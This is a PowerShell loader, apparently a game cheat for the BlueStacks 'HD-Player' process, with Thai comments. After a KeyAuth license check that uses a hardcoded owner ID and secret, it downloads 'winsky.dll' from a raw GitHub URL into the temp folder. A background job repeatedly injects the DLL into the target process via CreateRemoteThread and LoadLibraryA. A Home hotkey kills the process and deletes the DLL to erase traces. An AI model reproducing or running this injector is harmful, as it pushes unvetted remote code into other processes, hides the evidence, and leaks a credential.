[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- Config KeyAuth ---
$Name    = "Relaxwtf777's Application"
$OwnerID = "W404AorT6U"
$Secret  = "bdd0ab6c75599fffdb5ad43d22a82fe8bf8fa0fbd92dfdfbb2df80dc6d105d38"
$Version = "1.0"

function Show-Auth {
    Clear-Host
    Write-Host "==============================" -ForegroundColor Cyan
    Write-Host "    BASX RE-LINK SYSTEM v$Version" -ForegroundColor Cyan
    Write-Host "==============================" -ForegroundColor Cyan
    
    $initUrl = "https://keyauth.win/api/1.2/?type=init&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID&secret=$Secret&version=$Version"
    try {
        $initRes = Invoke-RestMethod -Uri $initUrl -Method Get
        if ($initRes.success -ne $true) { return $false }
        $sessionId = $initRes.sessionid
    } catch { return $false }

    $key = Read-Host " Enter License Key"
    $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
    $loginUrl = "https://keyauth.win/api/1.2/?type=license&key=$key&hwid=$hwid&sessionid=$sessionId&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID"
    
    try {
        $loginRes = Invoke-RestMethod -Uri $loginUrl -Method Get
        return $loginRes.success -eq $true
    } catch { return $false }
}

if (Show-Auth) {
    $dllUrl = "https://raw.githubusercontent.com/relaxhaha56-maker/node-storage-33/refs/heads/main/winsky.dll"
    $tempPath = "$env:TEMP\winsky.dll"
    $targetProc = "HD-Player"

    Write-Host "[*] Downloading winsky.dll..." -ForegroundColor Yellow
    try { (New-Object System.Net.WebClient).DownloadFile($dllUrl, $tempPath) } catch { exit }

    # ส่วน Background Job ที่ปรับปรุงใหม่ให้สแกนหา Process ใหม่ตลอดเวลา
    $ScriptBlock = {
        param($path, $pName)
        Add-Type -AssemblyName PresentationCore
        
        # ฟังก์ชันฉีดแบบ Re-loadable
        $code = @"
        using System;
        using System.Runtime.InteropServices;
        using System.Diagnostics;
        using System.Text;
        public class Injector {
            [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
            [DllImport("kernel32.dll", CharSet = CharSet.Auto)] public static extern IntPtr GetModuleHandle(string lpModuleName);
            [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
            [DllImport("kernel32.dll", SetLastError = true)] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
            [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
            public static void Run(string path, int pid) {
                IntPtr hProc = OpenProcess(0x001F0FFF, false, pid);
                if (hProc == IntPtr.Zero) return;
                IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)path.Length + 1, 0x3000, 0x40);
                IntPtr outSize;
                WriteProcessMemory(hProc, addr, Encoding.Default.GetBytes(path), (uint)path.Length + 1, out outSize);
                IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                CreateRemoteThread(hProc, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
            }
        }
"@
        Add-Type -TypeDefinition $code

        while ($true) {
            # 1. ค้นหา Process ทุกรอบลูป (กันปัญหา PID เปลี่ยนหลังรีบลู)
            $proc = Get-Process $pName -ErrorAction SilentlyContinue
            
            if ($proc) {
                # เช็คว่าฉีดไปหรือยัง โดยดูจากรายชื่อ Modules ของ Process นั้นๆ
                $alreadyIn = $false
                try {
                    $modules = $proc.Modules
                    foreach ($m in $modules) { if ($m.ModuleName -eq "winsky.dll") { $alreadyIn = $true; break } }
                } catch { }

                if (-not $alreadyIn) {
                    # ถ้ายังไม่ติด ให้ฉีดทันที
                    [Injector]::Run($path, $proc.Id)
                }
            }

            # 2. ปุ่ม Home: ปิดบลู + ล้างร่องรอย + หยุด Job
            if ([Windows.Input.Keyboard]::IsKeyDown([Windows.Input.Key]::Home)) {
                Stop-Process -Name $pName -Force -ErrorAction SilentlyContinue
                Remove-Item $path -Force -ErrorAction SilentlyContinue
                break
            }
            
            Start-Sleep -Seconds 3 # เช็คทุก 3 วินาที (กำลังดี ไม่หน่วงเครื่อง)
        }
    }

    # รัน Job เบื้องหลัง
    Start-Job -ScriptBlock $ScriptBlock -ArgumentList $tempPath, $targetProc -Name "BasX_Relink_Service"

    Write-Host "[+] BasX Active: ระบบจะคอยฉีดให้เองแม้คุณจะ Restart บลู" -ForegroundColor Green
    Write-Host "[!] กด 'HOME' เพื่อปิดเกมและหยุดโปรทั้งหมด" -ForegroundColor Red
    Start-Sleep -Seconds 3
}
